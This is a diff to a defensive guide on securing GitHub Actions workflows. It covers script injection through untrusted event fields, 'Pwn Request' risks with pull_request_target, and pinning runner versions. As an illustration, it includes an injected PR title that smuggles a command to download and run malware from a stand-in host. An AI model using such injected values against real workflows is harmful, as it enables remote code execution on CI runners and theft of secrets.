@@ -229,15 +229,54 @@ and between jobs within a workflow.
 
 === Untrusted input
 
-Don't directly reference values you don't control, like:
+Don't directly reference values you don't control. Consider the following
+example:
 
 [source,yaml]
 ----
-echo "${{github.event.pull_request.title}}"
+- name: lint
+  run: |
+    echo "${{github.event.pull_request.title}}" | commitlint
 ----
 
-This allows for injection of malicious code into the workflow. Instead, either
-use an action with arguments (this is the RECOMMENDED solution):
+This allows for injection of malicious code into the workflow. For example,
+raising a PR with the following title...
+
+[source,txt]
+----
+a" && wget https://example.com/malware && ./malware && echo "Title
+----
+
+... would cause the following code to be executed in your runner:
+
+[source,txt]
+----
+echo “a" && wget https://example.com/malware && ./malware && echo "Title” | commitlint
+----
+
+The pull request body is also untrusted, as are all of the following event
+context data:
+
+* `github.event.issue.title`
+* `github.event.issue.body`
+* `github.event.pull_request.title`
+* `github.event.pull_request.body`
+* `github.event.comment.body`
+* `github.event.review.body`
+* `github.event.pages.*.page_name`
+* `github.event.commits.*.message`
+* `github.event.head_commit.message`
+* `github.event.head_commit.author.email`
+* `github.event.head_commit.author.name`
+* `github.event.commits.*.author.email`
+* `github.event.commits.*.author.name`
+* `github.event.pull_request.head.ref`
+* `github.event.pull_request.head.label`
+* `github.event.pull_request.head.repo.default_branch`
+* `github.head_ref`
+
+There are two possible solutions. The RECOMMENDED one is to use an action
+with arguments:
 
 [source,yaml]
 ----
@@ -257,36 +296,16 @@ Alternatively, bind the value to an intermediate environment variable:
     echo "$PR_TITLE"
 ----
 
-=== External PRs
+[NOTE]
+======
+It is best practice to double-quote shell variable to avoid word splitting.
+This practice is relevant to shell scripting in general, and is not specific
+to GitHub Actions.
+======
 
-For public repositories, do not check out the code when using the
-`pull_request_target` event.
-
-[source,yaml]
-----
-on: pull_request_target
-#...
-  - uses: actions/checkout@v3
-    with:
-      ref: ${{ github.event.pull_request.head.sha }}
-----
-
-External PRs may trigger the workflow, and those workflows will be run in the
-context of the base branch of the PR. Although workflows from forks do not have
-access to your secrets, the code of the base branch is nevertheless considered
-untrusted, and therefore you MUST NOT check it out, build, or run it.
-
-There is more detail on this attack vector on {link-docs-security-lab}[GitHub's
-Security Lab] blog, but the TL;DR is that combining use of the
-`pull_request_target` trigger with explicit checkout of a public repository
-may open up security vulnerabilities.
-
-For all other workflow triggers in public repositories, it is RECOMMENDED to
-disable automatic workflow runs from forks. Workflows on pull requests to
-public repositories from outside contributors will not run automatically by
-default. Instead, the run needs to be triggered manually by a maintainer.
-Workflow approval requirements can be configured for a repository, organization,
-or at the enterprise level.
+More generally, be cautious when using any external input in your workflows.
+For example, avoid using untrusted data in API calls where the data could be
+interpreted as code (script injection).
 
 === Consuming open source actions
 
@@ -319,22 +338,64 @@ The following steps are RECOMMENDED when using third-party actions:
   uses: actions/checkout@a12a3943b4bdde767164f792f33f40b04645d846
 ----
 
-=== GitHub-hosted runners
+=== External PRs
 
-It is recommended to pin workflows to specific runner versions, such as
-`ubuntu-22.04` rather than `ubuntu-latest`. This means you must manually
-update workflow configurations when old runner versions are deprecated,
-but the tradeoff is your workflows will be more stable in the meantime.
-(This is less an issue of security, more an issue of maintenance.)
+For public repositories, do not check out the code when using the
+`pull_request_target` event.
 
 [source,yaml]
 ----
-# Prefer:
-runs-on: ubuntu-22.04
-
-# To:
-runs-on: ubuntu-latest
+on: pull_request_target
+#...
+  - uses: actions/checkout@v3
+    with:
+      ref: ${{ github.event.pull_request.head.sha }}
 ----
+
+Normally, workflow runs triggered from forks do not have access to secrets,
+or write access to the repository, because the runs happen in the context of the
+_base_ branch of the PR. However, the `pull_request_target` event is a special
+case. GitHub introduced this event type at the request of the open source
+community so that workflows could be run in the context of the _target_ branch
+of a PR. But this has important security implications.
+
+Using the `pull_request_target` events means the workflow will have access to
+your secrets and write access to your code. Iff the workflow is also checking out
+and running code from the repository, that code can't be trusted because it has
+come from the external contributor. You're opening up your workflow to remote
+code execution.
+
+This security vulnerability is known as a "Pwn Request". It is a type of attack
+where an attacker forks a public repository, creates a pull request to the
+original repository, and then triggers a workflow run on the original repository
+that checks out the attacker's code. The attacker can use their own code in the
+context of the original repository. This could be used to extract secrets,
+modify the repository's code, or even take over the repository.
+
+Therefore, whenever you use `pull_request_target` in a workflow, the workflow's
+jobs MUST NOT check out, build, or run the repository's code. All code executed
+in a `pull_request_target` workflow MUST be defined within the workflow
+configuration itself.
+
+There is more detail on this attack vector on {link-docs-security-lab}[GitHub's
+Security Lab] blog.
+
+For all other workflow triggers in public repositories, it is RECOMMENDED to
+disable automatic workflow runs from forks. Workflows on pull requests to
+public repositories from _first-time_ outside contributors will not run
+automatically by default. It is strongly RECOMMENDED that you disable automatic
+workflow runs triggered by external contributors all of the time. This means
+that project maintainers can review code in external PRs before triggering the
+CI to run on those changes. Workflow approval requirements can be configured for
+a repository, organization, or at the enterprise level.
+
+More generally, when adding workflows to public repositories, consider the
+security implications by asking the following questions:
+
+* What events could trigger a workflow run?
+* What code is running in the running?
+* What data and secrets does that code access?
+* Where did that code come from? Can it be trusted?
 
 === Self-hosted runners
 
@@ -365,3 +426,20 @@ the workflows and actions that run on them.
 GitHub doesn't allow personal accounts to use self-hosted runners on public
 repositories, but they do allow organizations to do so.
 ======
+
+=== GitHub-hosted runners
+
+It is recommended to pin workflows to specific runner versions, such as
+`ubuntu-22.04` rather than `ubuntu-latest`. This means you must manually
+update workflow configurations when old runner versions are deprecated,
+but the tradeoff is your workflows will be more stable in the meantime.
+(This is less an issue of security, more an issue of maintenance.)
+
+[source,yaml]
+----
+# Prefer:
+runs-on: ubuntu-22.04
+
+# To:
+runs-on: ubuntu-latest
+----
